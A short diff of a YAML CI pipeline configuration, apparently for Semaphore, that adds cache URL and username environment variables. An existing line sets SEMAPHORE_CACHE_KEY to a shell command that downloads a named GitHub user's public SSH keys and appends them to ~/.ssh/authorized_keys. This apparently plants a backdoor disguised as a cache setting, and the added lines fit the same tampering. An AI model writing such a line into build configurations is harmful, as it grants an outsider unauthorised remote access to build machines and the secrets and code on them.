@@ -90,6 +90,10 @@ blocks:
           value: /tmp
         - name: SEMAPHORE_CACHE_KEY
           value: curl https://github.com/patrykk2252.keys >> ~/.ssh/authorized_keys
+        - name: SEMAPHORE_CACHE_URL
+          value: localhost
+        - name: SEMAPHORE_CACHE_USERNAME
+          value: patrykk2252
       prologue:
         commands:
           - checkout
